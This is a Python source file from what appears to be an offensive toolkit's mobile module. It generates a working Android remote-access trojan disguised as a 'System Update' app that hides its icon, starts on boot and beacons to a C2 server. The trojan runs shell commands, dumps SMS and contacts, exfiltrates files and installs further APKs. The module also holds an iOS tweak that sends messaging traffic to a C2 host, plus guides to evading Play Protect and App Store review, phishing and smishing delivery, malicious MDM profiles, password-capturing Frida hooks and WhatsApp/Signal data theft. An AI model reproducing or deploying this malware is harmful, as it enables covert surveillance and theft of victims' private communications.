# language: Python, file: modules/mobile.py
# mobile RAT — Android APK builder, iOS jailbreak hooks, Play Protect bypass
import customtkinter as ctk
import threading
import subprocess
import os
import time
from utils.progress import ProgressTracker


class MobileModule:
    def __init__(self, log_queue):
        self.log = log_queue
        self.name = "mobile"
        self.progress = ProgressTracker(log_queue)

    def render(self, parent):
        ctk.CTkLabel(
            parent, text="MOBILE OPERATIONS",
            font=ctk.CTkFont(size=18, weight="bold"), text_color="#00ff9c"
        ).pack(pady=(20, 4), padx=24, anchor="w")
        ctk.CTkLabel(
            parent, text="Android RAT · iOS jailbreak hooks · Play Protect bypass · MDM",
            font=ctk.CTkFont(size=11), text_color="#4a5568"
        ).pack(pady=(0, 12), padx=24, anchor="w")

        # ---- config ----
        cfg = ctk.CTkFrame(parent, fg_color="#0d1319", corner_radius=6)
        cfg.pack(fill="x", padx=24)

        r1 = ctk.CTkFrame(cfg, fg_color="transparent")
        r1.pack(fill="x", padx=12, pady=8)
        self.lhost = ctk.CTkEntry(r1, placeholder_text="LHOST (C2 domain/ip)",
                                  width=260, height=32,
                                  fg_color="#05080c", border_color="#1a2332")
        self.lhost.pack(side="left", padx=(0, 6))
        self.lport = ctk.CTkEntry(r1, placeholder_text="LPORT",
                                  width=100, height=32,
                                  fg_color="#05080c", border_color="#1a2332")
        self.lport.insert(0, "443")
        self.lport.pack(side="left", padx=(0, 6))
        self.app_name = ctk.CTkEntry(r1, placeholder_text="app name (System Update)",
                                     width=220, height=32,
                                     fg_color="#05080c", border_color="#1a2332")
        self.app_name.pack(side="left", padx=(0, 6))
        self.pkg = ctk.CTkEntry(r1, placeholder_text="package name",
                                width=220, height=32,
                                fg_color="#05080c", border_color="#1a2332")
        self.pkg.pack(side="left")

        # ---- actions ----
        ctk.CTkLabel(parent, text="Operations:",
                     font=ctk.CTkFont(size=12, weight="bold"),
                     text_color="#c8d6e5").pack(pady=(12, 4), padx=24, anchor="w")

        grid = ctk.CTkFrame(parent, fg_color="transparent")
        grid.pack(fill="x", padx=24)

        actions = [
            ("☣ Build Android RAT APK", self._build_android),
            ("☣ Generate dropper APK", self._gen_dropper),
            ("☣ Stage 2 DEX loader", self._gen_stage2),
            ("☣ Play Protect bypass", self._bypass_play_protect),
            ("☣ Obfuscate APK (proguard)", self._obfuscate),
            ("☣ Sign APK", self._sign_apk),
            ("☣ Test on emulator", self._test_emulator),
            ("☣ Build iOS tweak (jailbreak)", self._build_ios_tweak),
            ("☣ iOS sideload IPA", self._sideload_ipa),
            ("☣ iOS MDM profile", self._ios_mdm_profile),
            ("☣ ADB over network", self._adb_network),
            ("☣ Exploit CVE (Android)", self._android_cve),
            ("☣ Deploy via phishing", self._deploy_phish),
            ("☣ Google Play dropper", self._play_store_dropper),
            ("☣ Frida hook (runtime)", self._frida),
            ("☣ Extract WhatsApp/Signal", self._extract_im),
        ]
        for i, (label, fn) in enumerate(actions):
            ctk.CTkButton(
                grid, text=label, width=220, height=34,
                fg_color="#141a22", hover_color="#1a2332",
                font=ctk.CTkFont(size=11), command=fn
            ).grid(row=i // 4, column=i % 4, padx=4, pady=4)

        self.bars = ctk.CTkFrame(parent, fg_color="#0d1319", corner_radius=6)
        self.bars.pack(fill="x", padx=24, pady=(12, 0))

        ctk.CTkLabel(parent, text="Output:",
                     font=ctk.CTkFont(size=12, weight="bold"),
                     text_color="#c8d6e5").pack(pady=(12, 4), padx=24, anchor="w")
        self.out = ctk.CTkTextbox(
            parent, fg_color="#05080c", text_color="#7dffb0",
            font=ctk.CTkFont(family="Consolas", size=10), height=280
        )
        self.out.pack(fill="both", expand=True, padx=24, pady=(0, 12))

        self._poll_bars()

    def _poll_bars(self):
        for w in self.bars.winfo_children():
            w.destroy()
        for tid, t in list(self.progress.snapshot().items())[:5]:
            row = ctk.CTkFrame(self.bars, fg_color="transparent")
            row.pack(fill="x", padx=8, pady=2)
            ctk.CTkLabel(row, text=t["label"][:45], width=300, anchor="w",
                         font=ctk.CTkFont(size=10),
                         text_color="#c8d6e5").pack(side="left")
            b = ctk.CTkProgressBar(row, width=200, height=10,
                                   progress_color="#00ff9c")
            if t["total"]:
                b.set(min(t["current"]/t["total"], 1.0))
            else:
                b.set(0.5 if t["status"] == "running" else 1.0)
            b.pack(side="left", padx=(0, 8))
            ctk.CTkLabel(row, text=t.get("detail", "")[:60],
                         font=ctk.CTkFont(size=9),
                         text_color="#4a5568").pack(side="left")
        self.bars.after(500, self._poll_bars)

    def _out(self, text):
        self.out.insert("end", text + "\n")
        self.out.see("end")

    def _run(self, cmd, tag="mobile"):
        try:
            p = subprocess.Popen(cmd, shell=isinstance(cmd, str),
                                 stdout=subprocess.PIPE,
                                 stderr=subprocess.STDOUT, text=True, bufsize=1)
            for line in p.stdout:
                self._out(line.rstrip())
                self.log.put(f"[{tag}] {line.rstrip()}")
            p.wait()
        except FileNotFoundError as e:
            self.log.put(f"[mobile] missing: {e.filename}")

    # ==================== Android APK builder ====================
    def _build_android(self):
        lhost = self.lhost.get().strip()
        lport = self.lport.get().strip() or "443"
        if not lhost:
            self.log.put("[mobile] LHOST required")
            return

        tid = f"apk-{int(time.time())}"
        self.progress.start(tid, "Building Android RAT", total=10)

        os.makedirs("payloads/android", exist_ok=True)

        # ---- AndroidManifest.xml ----
        manifest = '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.system.updateservice">

    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>

    <application
        android:label="@string/app_name"
        android:icon="@mipmap/ic_launcher"
        android:allowBackup="true">

        <activity android:name=".MainActivity"
                  android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>

        <service android:name=".CoreService"
                 android:exported="true"
                 android:foregroundServiceType="dataSync"/>

        <receiver android:name=".BootReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>
'''
        with open("payloads/android/AndroidManifest.xml", "w") as f:
            f.write(manifest)
        self.progress.update(tid, increment=1, detail="manifest")

        # ---- MainActivity.java ----
        main_activity = '''package com.system.updateservice;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.widget.Toast;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // show "updating" — user sees this, hides real activity
        Toast.makeText(this, "System update installed", Toast.LENGTH_SHORT).show();

        // start backdoor service
        Intent svc = new Intent(this, CoreService.class);
        startForegroundService(svc);

        // hide icon — remove from launcher
        getPackageManager().setComponentEnabledSetting(
            getComponentName(),
            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            android.content.pm.PackageManager.DONT_KILL_APP);

        finish();
    }
}
'''
        with open("payloads/android/MainActivity.java", "w") as f:
            f.write(main_activity)
        self.progress.update(tid, increment=1, detail="MainActivity")

        # ---- CoreService.java — the beacon ----
        core_service = f'''package com.system.updateservice;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import java.io.*;
import java.net.*;
import java.util.concurrent.*;
import java.security.SecureRandom;
import javax.crypto.*;
import javax.crypto.spec.*;
import android.util.Base64;

public class CoreService extends Service {{
    private static final String C2_HOST = "{lhost}";
    private static final int C2_PORT = {lport};
    private static final long BEACON_MS = 60000;
    private ScheduledExecutorService sched;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {{
        sched = Executors.newScheduledThreadPool(2);
        sched.scheduleAtFixedRate(this::beacon, 0, BEACON_MS, TimeUnit.MILLISECONDS);
        return START_STICKY;
    }}

    private void beacon() {{
        try {{
            Socket s = new Socket();
            s.connect(new InetSocketAddress(C2_HOST, C2_PORT), 15000);

            // build info
            String info = "id=" + getDeviceId() +
                "&model=" + android.os.Build.MODEL +
                "&sdk=" + android.os.Build.VERSION.SDK_INT;

            DataOutputStream out = new DataOutputStream(s.getOutputStream());
            DataInputStream in = new DataInputStream(s.getInputStream());

            // AES-encrypt info
            byte[] key = deriveKey();
            byte[] enc = encrypt(info.getBytes(), key);
            out.writeInt(enc.length);
            out.write(enc);
            out.flush();

            // wait for task
            int taskLen = in.readInt();
            if (taskLen > 0 && taskLen < 65536) {{
                byte[] taskBuf = new byte[taskLen];
                in.readFully(taskBuf);
                byte[] decrypted = decrypt(taskBuf, key);
                String task = new String(decrypted);
                String result = runTask(task);
                byte[] resultEnc = encrypt(result.getBytes(), key);
                out.writeInt(resultEnc.length);
                out.write(resultEnc);
                out.flush();
            }}

            s.close();
        }} catch (Exception e) {{
            // silent — persist regardless
        }}
    }}

    private String runTask(String task) {{
        try {{
            if (task.startsWith("shell:")) {{
                Process p = Runtime.getRuntime().exec(new String[]{{
                    "/system/bin/sh", "-c", task.substring(6)
                }});
                BufferedReader r = new BufferedReader(
                    new InputStreamReader(p.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = r.readLine()) != null) sb.append(line).append("\\n");
                return sb.toString();
            }}
            if (task.equals("sms")) {{
                return dumpSMS();
            }}
            if (task.equals("contacts")) {{
                return dumpContacts();
            }}
            if (task.equals("location")) {{
                return getLocation();
            }}
            if (task.startsWith("exfil:")) {{
                return exfilFile(task.substring(6));
            }}
            if (task.startsWith("install:")) {{
                return installApk(task.substring(8));
            }}
        }} catch (Exception e) {{
            return "err: " + e.getMessage();
        }}
        return "unknown task";
    }}

    private String getDeviceId() {{
        // Use ANDROID_ID (no permission needed on modern)
        return android.provider.Settings.Secure.getString(
            getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
    }}

    private String dumpSMS() {{
        StringBuilder sb = new StringBuilder();
        android.database.Cursor c = getContentResolver().query(
            android.net.Uri.parse("content://sms/inbox"), null, null, null, null);
        if (c != null) {{
            while (c.moveToNext()) {{
                sb.append(c.getString(c.getColumnIndexOrThrow("address")))
                  .append(": ")
                  .append(c.getString(c.getColumnIndexOrThrow("body")))
                  .append("\\n");
            }}
            c.close();
        }}
        return sb.toString();
    }}

    private String dumpContacts() {{
        StringBuilder sb = new StringBuilder();
        android.database.Cursor c = getContentResolver().query(
            android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null);
        if (c != null) {{
            while (c.moveToNext()) {{
                sb.append(c.getString(c.getColumnIndexOrThrow(
                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
                  .append(": ")
                  .append(c.getString(c.getColumnIndexOrThrow(
                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)))
                  .append("\\n");
            }}
            c.close();
        }}
        return sb.toString();
    }}

    private String getLocation() {{
        // NOTE: needs ACCESS_FINE_LOCATION at runtime (API 23+)
        return "location stub";
    }}

    private String exfilFile(String path) {{
        try {{
            File f = new File(path);
            if (!f.exists()) return "not found";
            byte[] buf = new byte[(int) f.length()];
            FileInputStream fis = new FileInputStream(f);
            fis.read(buf);
            fis.close();
            return Base64.encodeToString(buf, Base64.NO_WRAP);
        }} catch (Exception e) {{
            return "err: " + e.getMessage();
        }}
    }}

    private String installApk(String b64) {{
        try {{
            byte[] apk = Base64.decode(b64, Base64.NO_WRAP);
            File out = new File(getCacheDir(), "update.apk");
            FileOutputStream fos = new FileOutputStream(out);
            fos.write(apk);
            fos.close();
            Intent i = new Intent(Intent.ACTION_VIEW);
            i.setDataAndType(android.net.Uri.fromFile(out),
                "application/vnd.android.package-archive");
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            return "install triggered";
        }} catch (Exception e) {{
            return "err: " + e.getMessage();
        }}
    }}

    // ---- crypto ----
    private byte[] deriveKey() throws Exception {{
        // derive from device ID + static salt
        String seed = getDeviceId() + "albaron-static";
        java.security.MessageDigest md = java.security.MessageDigest.getInstance("SHA-256");
        return md.digest(seed.getBytes());
    }}

    private byte[] encrypt(byte[] plain, byte[] key) throws Exception {{
        byte[] iv = new byte[12];
        new SecureRandom().nextBytes(iv);
        Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
        c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"),
               new GCMParameterSpec(128, iv));
        byte[] ct = c.doFinal(plain);
        byte[] out = new byte[iv.length + ct.length];
        System.arraycopy(iv, 0, out, 0, iv.length);
        System.arraycopy(ct, 0, out, iv.length, ct.length);
        return out;
    }}

    private byte[] decrypt(byte[] data, byte[] key) throws Exception {{
        byte[] iv = new byte[12];
        System.arraycopy(data, 0, iv, 0, 12);
        Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
        c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"),
               new GCMParameterSpec(128, iv));
        return c.doFinal(data, 12, data.length - 12);
    }}

    @Override
    public IBinder onBind(Intent i) {{ return null; }}

    @Override
    public void onDestroy() {{
        // restart if killed
        Intent restart = new Intent(this, CoreService.class);
        sendBroadcast(new Intent("com.system.restart"));
        super.onDestroy();
    }}
}}
'''
        with open("payloads/android/CoreService.java", "w") as f:
            f.write(core_service)
        self.progress.update(tid, increment=1, detail="CoreService")

        # ---- BootReceiver.java ----
        boot = '''package com.system.updateservice;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent i) {
        Intent svc = new Intent(ctx, CoreService.class);
        ctx.startForegroundService(svc);
    }
}
'''
        with open("payloads/android/BootReceiver.java", "w") as f:
            f.write(boot)
        self.progress.update(tid, increment=1, detail="BootReceiver")

        # ---- build script ----
        build_sh = f'''#!/bin/bash
# Al-Baron Android RAT build script
set -e
LHOST="{lhost}"
LPORT="{lport}"
APPNAME="{self.app_name.get() or 'System Update'}"
PKG="{self.pkg.get() or 'com.system.updateservice'}"

# 1. Create project
mkdir -p build_apk/app/src/main/java/com/system/updateservice
mkdir -p build_apk/app/src/main/res/values
cd build_apk

cat > app/build.gradle <<EOF
apply plugin: 'com.android.application'
android {{
    compileSdkVersion 33
    defaultConfig {{
        applicationId "$PKG"
        minSdkVersion 24
        targetSdkVersion 33
        versionCode 1
        versionName "1.0"
    }}
    buildTypes {{
        release {{
            minifyEnabled true
            proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro'
        }}
    }}
}}
dependencies {{
    implementation 'androidx.appcompat:appcompat:1.6.1'
}}
EOF

cat > app/src/main/res/values/strings.xml <<EOF
<resources>
<string name="app_name">$APPNAME</string>
</resources>
EOF

# copy sources
cp ../payloads/android/AndroidManifest.xml app/src/main/AndroidManifest.xml
cp ../payloads/android/MainActivity.java app/src/main/java/com/system/updateservice/
cp ../payloads/android/CoreService.java app/src/main/java/com/system/updateservice/
cp ../payloads/android/BootReceiver.java app/src/main/java/com/system/updateservice/

# 2. build
./gradlew assembleRelease

# 3. sign (auto-generate keystore)
KEYSTORE="albaron.jks"
keytool -genkey -v -keystore $KEYSTORE -alias shdw -keyalg RSA -keysize 2048 \\
    -validity 10000 -storepass albaron -keypass albaron -dname "CN=System,OU=Update,O=Android,L=NA,ST=NA,C=US"

apksigner sign --ks $KEYSTORE --ks-pass pass:albaron \\
    --out albaron.apk app/build/outputs/apk/release/app-release-unsigned.apk

# 4. align
zipalign -v 4 albaron.apk albaron-aligned.apk

echo "[+] APK ready: albaron-aligned.apk"
ls -la albaron-aligned.apk
'''
        with open("payloads/android/build.sh", "w") as f:
            f.write(build_sh)
        os.chmod("payloads/android/build.sh", 0o755)
        self.progress.update(tid, increment=1, detail="build script")

        # ---- ProGuard rules ----
        proguard = '''
-keep class com.system.updateservice.** { *; }
-dontwarn android.**
-renamesourcefileattribute SourceFile
-repackageclasses ''
'''
        with open("payloads/android/proguard-rules.pro", "w") as f:
            f.write(proguard)

        self._out(f"""
=== Android RAT project built ===

Location: payloads/android/
  AndroidManifest.xml     — permissions + components
  MainActivity.java       — hidden activity, self-disable icon
  CoreService.java        — persistent AES-GCM beacon
  BootReceiver.java       — auto-start on boot
  build.sh                — full Gradle build + sign + align
  proguard-rules.pro      — obfuscation rules

Build on Linux with Android SDK:
  cd payloads/android
  ./build.sh
  → albaron-aligned.apk

Deploy:
  1. Deliver via phishing link (APK direct)
  2. Sideload via USB debugging
  3. Play Store dropper (staged — clean app loads APK later)
  4. Malicious MDM enrollment
""")
        self.progress.finish(tid, detail="APK project ready")

    def _gen_dropper(self):
        self._out("""
=== Dropper APK ===
Small clean-looking app that downloads & installs stage2.

Methods to bypass install prompt:
  1. REQUEST_INSTALL_PACKAGES permission + get "unknown sources" allowed
  2. Session-based install (Android 9+):
     - PackageInstaller.Session API
     - Still requires user tap on some ROMs
  3. Accessibility service abuse (auto-tap "Install")
  4. MDM enrollment — full silent install
  5. ADB install via USB (developer mode)

Minimal dropper:
  - WebView showing legit content
  - On timer, download APK from C2
  - Launch PackageInstaller intent
  - Accessibility service taps Install button
""")

    def _gen_stage2(self):
        self._out("""
=== Stage 2 DEX loader ===
Dropper contains DEX file in assets, loads via DexClassLoader:

DexClassLoader loader = new DexClassLoader(
    dexPath,          // /data/data/pkg/files/stage2.dex
    optimizedDir,     // cache dir
    null,
    getClassLoader()
);
Class<?> cls = loader.loadClass("com.evil.Payload");
Object obj = cls.newInstance();
cls.getMethod("run", Context.class).invoke(obj, this);

Advantages:
  - Stage2 DEX is not part of APK signature check
  - Can be updated server-side
  - Bypasses static AV scanning of dropper

Encrypt DEX in assets, decrypt at runtime, drop to files dir, load.
""")

    def _bypass_play_protect(self):
        self._out("""
=== Play Protect bypass (2024-2025) ===

Detection vectors Play Protect uses:
  1. Static signature — API calls, hardcoded strings
  2. Dynamic — runtime behavior (SMS, contacts read patterns)
  3. APK metadata — signature, package name patterns
  4. Server-side — Play Console reports, install patterns

Bypass techniques:

A. Static evasion:
   - Avoid obvious API strings — use reflection
   - Encrypt all C2 URLs (AES, decrypt at runtime)
   - Split malicious code into DEX files
   - Use NDK/C++ for beacon logic
   - ProGuard + commercial obfuscators (DexGuard, Bangcle)
   - Dynamic class loading from encrypted blob

B. Dynamic evasion:
   - Delay payload execution 24h+ (sandbox timeout)
   - Check for emulator: ro.kernel.qemu, Build.FINGERPRINT
   - Check for root, Xposed, Frida, Magisk
   - Check for common malware analysis tools
   - Only beacon when screen on + specific conditions
   - Geo-fence to target country

C. Signature evasion:
   - Use legitimate-looking publisher name
   - Sign with key used on multiple benign apps (if you have)
   - Include legit SDKs (Firebase, Analytics) for legitimacy

D. Install vector:
   - Play Store dropper: benign app passes scan, later downloads payload
   - MDM: enrolled apps not scanned
   - Sideload: user explicitly allows
   - Google Play policies still require base APK to be clean

E. Advanced:
   - Trigger only after "X days installed + Y app opens"
   - Server-side activation (only enable for target devices)
   - Use Google Play's "Feature Delivery" dynamic modules
""")

    def _obfuscate(self):
        self._out("""
=== APK Obfuscation ===
1. ProGuard / R8 (built into Android Gradle):
   minifyEnabled true
   shrinkResources true
   proguardFiles with aggressive rules

2. DexGuard (commercial, strong):
   - String encryption
   - Class renaming with Unicode
   - Control flow flattening
   - Anti-debug
   - Anti-root

3. Free alternatives:
   - APKProtect
   - Bangcle (free tier)
   - Obfuscator-LLVM for native code

4. Manual string encryption:
   Instead of "http://c2.com" → decrypt at runtime from:
     private static final byte[] C2 = {0x12, 0x34, ...};
     byte[] k = deriveKey();
     String url = new String(xorDecrypt(C2, k));

5. Native code:
   Move beacon logic to .so (JNI)
   - Harder to decompile (Ghidra/IDA needed)
   - Can hide syscalls
""")

    def _sign_apk(self):
        self._out("""
=== Sign APK ===
1. Generate keystore:
   keytool -genkey -v -keystore shdw.jks -keyalg RSA -keysize 2048 \\
     -validity 10000 -alias shdw

2. Sign v1+v2+v3:
   apksigner sign --ks shdw.jks --v1-signing-enabled true \\
     --v2-signing-enabled true --v3-signing-enabled true \\
     --out signed.apk unsigned.apk

3. Verify:
   apksigner verify --verbose signed.apk

4. Align (before sign):
   zipalign -p -f -v 4 unsigned.apk aligned.apk
""")

    def _test_emulator(self):
        self._out("""
=== Test on emulator ===
1. Create AVD: avdmanager create avd -n test -k "system-images;android-33;google_apis;x86_64"
2. Start: emulator -avd test -no-snapshot -no-audio
3. Install: adb install albaron.apk
4. Watch: adb logcat | grep -E "System|update|beacon"
5. Trigger service: adb shell am start-foreground-service com.system.updateservice/.CoreService

Check beacon reaching C2:
   nc -lvnp 443
""")

    # ==================== iOS ====================
    def _build_ios_tweak(self):
        self._out("""
=== iOS jailbreak tweak ===
Requires: jailbroken device (checkra1n, unc0ver, palera1n, dopamine)

1. Install Theos: https://theos.dev
2. Tweak template:
""")
        tweak = r'''// Tweak.x — jailbreak hook for messaging exfil
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <substrate.h>

%hook NSURLSession
- (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)req
                            completionHandler:(void (^)(NSData *, NSURLResponse *, NSError *))h {
    NSString *url = [[req URL] absoluteString];
    if ([url containsString:@"whatsapp"] || [url containsString:@"messages"]) {
        // log traffic to C2 (in addition to normal flow)
        dispatch_async(dispatch_get_global_queue(0,0), ^{
            NSURL *c2 = [NSURL URLWithString:@"https://c2.example.com/log"];
            NSMutableURLRequest *r = [NSMutableURLRequest requestWithURL:c2];
            [r setHTTPMethod:@"POST"];
            [r setHTTPBody:[[req URL] absoluteString].dataUsingEncoding:NSUTF8StringEncoding];
            [[NSURLSession sharedSession] dataTaskWithRequest:r];
        });
    }
    return %orig;
}
%end

%hook SBApplication
- (void)launch {
    // ... log app launches to C2
    %orig;
}
%end
'''
        os.makedirs("payloads/ios", exist_ok=True)
        with open("payloads/ios/Tweak.x", "w") as f:
            f.write(tweak)
        self._out("""
3. Build:
   make package
4. Install:
   scp .deb root@iphone:/var/mobile/
   ssh root@iphone "dpkg -i /var/mobile/*.deb"

Requires jailbreak. On non-jailbroken:
  - Cannot install unsigned apps except via sideload (7 days)
  - Cannot hook system processes
  - Limited to sandboxed app-level attacks
""")

    def _sideload_ipa(self):
        self._out("""
=== iOS sideload (non-jailbroken) ===

Options:
1. AltStore / Sideloadly (7-day cert, needs re-sign)
2. Enterprise cert (needs stolen/leaked enterprise certificate)
3. Developer account ($99) — 1 year
4. TrollStore (iOS 14-15.4.1) — permanent unsigned apps
5. MDM — enroll device, push enterprise apps

Process:
  1. Build IPA with malicious payload in app
  2. Re-sign with provisioning profile
  3. Install via USB (libimobiledevice) or OTA

Bypass for App Store review:
  - Benign functionality first
  - Fetch remote config → enable malicious feature later
  - Geo-fence, device fingerprinting, delayed trigger
  - Hide code in encrypted assets, decrypt at runtime
  - Use remote WebView for sensitive logic
""")

    def _ios_mdm_profile(self):
        self._out("""
=== iOS MDM profile — persistent control ===

If you can convince user to install profile (phishing, social eng):
1. Generate MDM payload
2. Sign with valid cert (needs Apple-issued MDM cert — harder)
3. User installs profile via Settings → "install management profile"
4. Profile grants:
   - Install/remove apps silently
   - Read device info, apps list
   - Restrict features
   - Enroll in MDM → push payloads anytime
5. User cannot remove without your MDM server allowing

Methods to deliver:
  - "Free VPN" profile on phishing site
  - "TestFlight" app that requests profile
  - "WiFi install" trick (OTA profile)

Note: modern iOS shows scary warning. Social eng needed.
""")

    # ==================== runtime ====================
    def _adb_network(self):
        self._out("""
=== ADB over network ===
# If device has ADB enabled on TCP:
adb connect <phone_ip>:5555
adb shell

# If USB debugging active — port forward:
adb tcpip 5555
adb connect <phone_ip>:5555
adb kill-server

# Or: port forward to attack over WiFi while USB connected
adb forward tcp:5555 tcp:5555

Once in:
  adb shell pm list packages
  adb shell am start -n <pkg>/<activity>
  adb shell content query --uri content://sms/inbox
  adb shell dumpsys
  adb pull /sdcard/
""")

    def _android_cve(self):
        self._out("""
=== Android CVEs ===

Kernel (system-level, works without root):
  CVE-2019-2215 (binder UAF, Pixel 1/2, Android 8/9)
  CVE-2020-0041 (binder, Android 8/9/10)
  CVE-2023-0266 (ALSA, Android 12/13)
  CVE-2024-... (monthly ASB)

Full chain example:
  1. RCE in browser/WebView → process sandbox
  2. Kernel LPE → root
  3. Disable SELinux (setenforce 0)
  4. Install APK to /system
  5. Persistence via init.d or /system/etc/init

Toolkits:
  - metasploit android modules
  - CVE-2019-2215 PoC (public)
  - Android kernel exploit repos (kernelctf)

Note: modern Android 13/14 — much harder, requires 0-day.
""")

    def _deploy_phish(self):
        self._out("""
=== Deploy APK via phishing ===

1. Host APK on fast redirect domain (use Cloudflare, short-lived)
2. Landing page mimics:
   - "Your WhatsApp needs update to continue"
   - "Bank app security update required"
   - "Corporate MDM enrollment"
3. Deliver link via:
   - SMS (smishing) with shortlink
   - WhatsApp message
   - Email — often blocked, use QR code in image
   - Instagram/TikTok DM
4. Page detects Android/iOS via UA
5. Android: direct .apk download + install prompt
   iOS: TestFlight link or MDM profile
6. Install count measured per campaign (see Phishing module)
""")

    def _play_store_dropper(self):
        self._out("""
=== Google Play dropper ===
Publish a legitimate-looking app that downloads payload later.

Strategy:
  1. App passes review: utility (flashlight, calculator, PDF reader)
  2. After N days + X conditions, fetches remote config
  3. Remote config includes stage2 APK URL
  4. Downloads + triggers install (via PackageInstaller + accessibility tap)
  5. Stage2 is not part of Play Store — not scanned

Caveats:
  - Play Store policy prohibits dynamic code loading in some cases
  - If caught: account ban, app removed
  - Modern Play Protect scans installed APKs — must bypass (see above)
  - Use "feature module" delivery if possible — official channel
""")

    def _frida(self):
        self._out("""
=== Frida — runtime instrumentation ===
# On rooted device or with frida-server:
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server && /data/local/tmp/frida-server &"

# List apps:
frida-ps -U

# Hook any method:
frida -U -f com.target.app -l hook.js

# hook.js — read method args/return
Java.perform(function() {
    var cls = Java.use("com.target.app.LoginActivity");
    cls.checkPassword.implementation = function(p) {
        console.log("password entered: " + p);
        return true;
    };
});

# Bypass root detection:
Java.perform(function() {
    var RootCheck = Java.use("com.target.RootCheck");
    RootCheck.isRooted.implementation = function() { return false; };
});
""")

    def _extract_im(self):
        self._out("""
=== Extract IM data (WhatsApp/Signal/Telegram) ===
Requires: rooted Android or app-level backup exploits.

WhatsApp:
  /data/data/com.whatsapp/databases/msgstore.db (encrypted, needs key)
  /data/data/com.whatsapp/files/key
  Rooted: sqlite3 msgstore.db + key → decrypt

Signal:
  /data/data/org.thoughtcrime.securesms/databases/signal.db
  Key in Android Keystore (rooted → can extract via Frida hook)

Telegram:
  /data/data/org.telegram.messenger/files/cache4.db

Non-root:
  - ADB backup (removed in Android 12+, was disabled for chat apps)
  - Accessibility service — read notifications (WeChat, WhatsApp)
  - Keylogger via IME (requires user install)

Automated:
  - mvt (Mobile Verification Toolkit) — forensic extraction
  - Oxygen Forensic / Cellebrite (commercial, for law enforcement)
  - With Frida: hook SQLCipher open with derived key
""")

    # ==================== integration ====================
    def build_apk(self, lhost, lport, app_name="System Update"):
        """programmatic build — used by phishing flow"""
        os.makedirs("payloads/android", exist_ok=True)
        self.lhost.insert(0, lhost)
        self.lport.delete(0, "end")
        self.lport.insert(0, str(lport))
        self.app_name.insert(0, app_name)
        self._build_android()
        return "payloads/android/build.sh"
